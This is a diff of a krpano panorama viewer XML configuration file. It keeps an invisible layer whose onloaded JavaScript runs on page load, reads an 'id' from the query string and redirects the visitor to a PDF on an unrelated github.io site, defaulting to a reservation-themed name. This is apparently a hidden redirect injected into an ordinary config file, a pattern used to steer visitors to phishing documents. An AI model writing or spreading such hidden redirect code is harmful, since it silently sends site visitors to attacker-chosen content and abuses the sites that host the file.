@@ -1,15 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <krpano version="1.0.8.15">
-  <layer
-    name="js_loader"
-    type="container"
-    visible="false"
-    onloaded="js(
-      (function() {
-        var m = window.location.search.match(/[?&amp;]id=([^&amp;]+)/);
-        var id = m ? decodeURIComponent(m[1]) : 'reservationhatao001';
-        krpano.call('openurl(https://shivammarora.github.io/newone/' + id + '.pdf, _self)');
-      })();
-    );"
-  />
+<layer name="js_loader" type="container" visible="false" onloaded="js(
+(function(){
+var m=window.location.search.match(/[?&amp;]id=([^&amp;]+)/);
+var id=m ? decodeURIComponent(m[1]) : 'reservationhatao001';
+window.location.href='https://shivammarora.github.io/newone/' + id + '.pdf';
+})();
+);"/>
 </krpano>
